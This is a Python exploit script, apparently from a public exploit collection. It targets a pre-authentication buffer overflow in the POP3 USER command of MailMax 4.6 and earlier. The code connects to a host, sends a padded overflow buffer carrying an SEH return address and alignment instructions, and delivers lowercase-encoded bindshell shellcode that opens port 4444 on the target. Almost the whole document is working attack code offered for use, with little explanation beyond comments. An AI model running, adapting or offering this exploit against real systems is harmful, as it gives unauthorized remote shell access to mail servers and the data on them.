#!/usr/bin/python
 
# MailMax <=v4.6 POP3 "USER" Remote Buffer Overflow Exploit (No Login Needed)
# Newer version's not tested, maybe vulnerable too
# A hard one this, the shellcode MUST be lowercase. Plus there are many opcode's that break
# the payload and opcodes that gets changed, like "\xc3" gets converted to "\xe3", and "\xd3" gets converted to "\xf3"
# written by localh0t
# Date: 29/03/12
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar
# Tested on: Windows XP SP3 Spanish (No DEP)
# Targets: Windows (All) (DEP Disabled)
# Shellcode: Bindshell on port 4444 (Change as you wish) (Lowercase Only, use EBX as baseaddr)
 
from socket import *
import sys, struct, os, time
 
if (len(sys.argv) < 3):
    print "\nMailMax <=v4.6 POP3 \"USER\" Remote Buffer Overflow Exploit (No Login Needed)"
        print "\n   Usage: %s <host> <port> \n" %(sys.argv[0])
    sys.exit()
 
print "\n[!] Connecting to %s ..." %(sys.argv[1])
 
# connect to host
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))
sock.recv(1024)
time.sleep(5)
 
buffer = "USER "
buffer += "A" * 1439 # padding
buffer += "\xEB\x06\x90\x90" # Short jmp (6 bytes)
buffer += "\x86\xb3\x02\x10" # pop | pop | ret 1c , dbmax2.dll
buffer += "\x90" * 8 # nops (just to be sure)
 
# popad's, so esp => shellcode
buffer += "\x61" * 145
# nop's to align
buffer += "\x90" * 11
# and ebx,esp
buffer += "\x21\xe3"
# or ebx,esp
buffer += "\x09\xe3"
# at this point, ebx = esp. The shellcode is lowercase (with numbers), baseaddr = EBX
buffer += ("j314d34djq34djk34d1431s11s7j314d34dj234dkms502ds5o0d35upj0204c40jxo2925k3fjeok95718gk20bn8434k6dmcoej2jc3b0164k82bn9455x3bl153l87g7143n3jgox41l81f31lgox5eog2dm8k5831d345f1kj9nb0491j0959ekx4c89557818332e7g828ko45xn94dn32dm2915kkgo385132e8g15mk34k2347koe0b2x0b3xlf3docn8kfj0428f591b3ck33530n0o16eo93191942kl53fnbn8o3jk1k907xjc085eo89k4b1f6dj145l4949k1338931e4bo3lkox415g2ko03e6c44943g83jg3169k02dm0nf382gn3n9j9l18433410k3cn29e70kk0e2cjcn94k91k1mxm9310839kf34mg0d0k846eoe8kmc7gj843nemkn1ld234323l9787f623f3f6199823kox0xok492890nclkn3895510j2je945982745c6c981e954g748enx7dlfl419k01914745b08og8ej03xkcj3540b4045k481jg834872lk3gm420jd241e5fkc4co8729948k0md98o27b625e893b6co54f426c3d9k8c7kn853905e48kf699d7f22oe6xn02gjx00jc188g58l4k5mf850e7e9479l8086bjd09lxnb70384d0e8elfoc938k3cm3j27cm335403b794f9b6el")
 
buffer += "\x90" * 2000
buffer += "\r\n"
print "[!] Sending exploit..."
sock.send(buffer)
sock.close()
print "[!] Exploit succeed. Now netcat %s on port 4444\n" %(sys.argv[1])
sys.exit()
